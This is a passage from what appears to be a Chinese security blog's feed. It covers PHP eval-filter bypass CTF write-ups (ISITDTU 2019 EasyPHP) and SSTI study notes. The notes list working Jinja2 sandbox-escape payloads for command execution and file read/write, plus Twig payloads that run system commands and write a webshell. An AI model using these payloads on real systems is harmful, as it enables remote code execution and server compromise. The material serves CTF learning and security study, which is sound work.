&#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>具体参看 <a href="https://www.freebuf.com/articles/web/186298.html">P神的文章</a><br>以及 <a href="https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/">微笑师傅的衍生操作</a></p><h1 id="ISITDTU-CTF-2019-EasyPHP"><a href="#ISITDTU-CTF-2019-EasyPHP" class="headerlink" title="ISITDTU CTF 2019 EasyPHP"></a>ISITDTU CTF 2019 EasyPHP</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$_</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>有点类似以前写的国赛的 <a href="https://www.suk1.top/2019/05/16/love_math/">love_math</a></p><p>正则匹配了一些字母和数字还有一些特殊符号。 具体调试正则 这里有个<a href="https://regex101.com/">工具网站</a></p><p>正则的意思是匹配 <code>\x00</code> 到 <code>空格(\x20)</code> 的字符， <code>0到9</code> 的数字、<code>&quot;$&amp;.,|[&#123;_defgops</code> 以及 <code>DEL（\x7f）</code> 字符。如果你提交的字符串出现上述字符，die。</p><p>第二个<code>strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd</code><br>表示我们提交的字符串一共不能出现多于 <strong>13种不同的字符</strong>。</p><p>允许出现的字符如下：<code>!#%()*+-/:;&lt;=&gt;?</code><br><code>@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&#125;~</code></p><h2 id="test-php"><a href="#test-php" class="headerlink" title="test.php"></a>test.php</h2><p>看一下内置函数还有哪些能用</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span>=<span class="title function_ invoke__">get_defined_functions</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$array</span>[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$arr</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;\`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$arr</span>) ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$arr</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$arr</span>.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">bcmul, rtrim, trim, ltrim</span><br><span class="line">chr, link, unlink, tan</span><br><span class="line">atan, atanh, tanh, intval</span><br><span class="line">mail, min, max</span><br></pre></td></tr></table></figure></div><p>虽然引号都被过滤了，但是PHP默认会把没有加引号的字符串当成常量处理，找不到对应常量就会将其解释成字符串，因此没有引号不是限制。</p><p>而且PHP调用函数，可以使用字符串调用。这个在当初 <a href="https://www.suk1.top/2020/02/05/GXY%E5%A5%97%E5%A8%83/">GXY禁止套娃</a> 有提到过</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/limit_webshell_1.png" data-fancybox="group" data-caption="limit_webshell_1" class="fancybox"><img alt="limit_webshell_1" title="limit_webshell_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/limit_webshell_1.png" class="lazyload"></a></p><p>注意到 <code>^</code> 符号没有被过滤，那么我们就可以通过对字符串进行运算来规避if了。</p><p>后面就是常规的异或解题</p><h2 id="相关的参考"><a href="#相关的参考" class="headerlink" title="相关的参考"></a>相关的参考</h2><p><a href="https://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/">Tiaonmmn.ZMZ官方wp</a><br><a href="https://www.cnblogs.com/BOHB-yunying/p/11520031.html">PHP代码审计，无字母数字webshell</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="瞎扯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
    <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>SSTi 模板注入笔记</title>
    <link href="https://manayakko.github.io/yakko117/2020/04/09/SSTi_learning/"/>
    <id>https://manayakko.github.io/yakko117/2020/04/09/SSTi_learning/</id>
    <published>2020-04-09T03:31:56.485Z</published>
    <updated>2020-04-13T01:41:01.208Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>小声bb，想玩FF7</p><h1 id="什么是SSTi"><a href="#什么是SSTi" class="headerlink" title="什么是SSTi"></a>什么是SSTi</h1><p><code>SSTi</code> 就是服务器端模板注入<code>(Server-Side Template Injection)</code>，也给出了一个注入的概念。<br>常见的注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。</p><p><code>SSTi</code> 也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，<code>SSTi</code> 利用的是现在的网站模板引擎(下面会提到)，主要针对<code>python</code>、<code>php</code>、<code>java</code> 的一些网站处理框架，比如<strong>Python</strong> 的 <strong>jinja2 mako tornado django</strong>，<strong>Php</strong> 的 <strong>smarty twig</strong>，<strong>Java</strong> 的 <strong>jade velocity</strong>。当这些框架对运用渲染函数生成html的时候会出现 <code>SSTi</code> 的问题。</p><p>现在网上提起的比较多的是Python的网站。</p><h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p><strong>模板引擎</strong> (这里特指用于Web开发的模板引擎)</p><ul><li>是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</li><li>可以让（网站）程序实现界面与数据分离,业务代码与逻辑代码的分离，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易。</li></ul><p>也就是说，利用 <strong>模板引擎</strong> 来生成前端的 <code>html代码</code>，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成 <code>模板+用户数据</code>的 <code>前端html页面</code>，然后反馈给浏览器，呈现在用户面前。</p><p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exec webshell1</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># exec webshell2</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125; </span><br><span class="line">    <span class="comment"># poppen的参数就是要执行的命令</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取基本类</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">object</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br></pre></td></tr></table></figure></div><h2 id="TWIG-全版本-通用-SSTI-payload"><a href="#TWIG-全版本-通用-SSTI-payload" class="headerlink" title="TWIG 全版本 通用 SSTI payload"></a>TWIG 全版本 通用 SSTI payload</h2><p><a href="https://xz.aliyun.com/t/7518">参考文档</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|<span class="built_in">map</span>(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|<span class="built_in">filter</span>(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;id&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|<span class="built_in">map</span>(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></div><h2 id="需要了解的一些东西"><a href="#需要了解的一些东西" class="headerlink" title="需要了解的一些东西"></a>需要了解的一些东西</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符串</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 元组</span></span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表</span></span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div><p><strong>_<em>class</em>_</strong> ：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div><p><strong>_<em>bases</em>_</strong> ：用来查看类的基类，也可是使用数组索引来查看特定位置的值</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[&lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;,</span><br><span class="line"> &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, </span><br><span class="line"> &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;, </span><br><span class="line"> &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;, </span><br><span class="line"> &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;, </span><br><span class="line"> &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;, </span><br><span class="line"> &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;,</span><br><span class="line">  &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;,</span><br><span class="line">    &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;,</span><br><span class="line">    &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;, </span><br><span class="line">    &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.getwindowsversion&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;nt.stat_result&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;nt.statvfs_result&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span 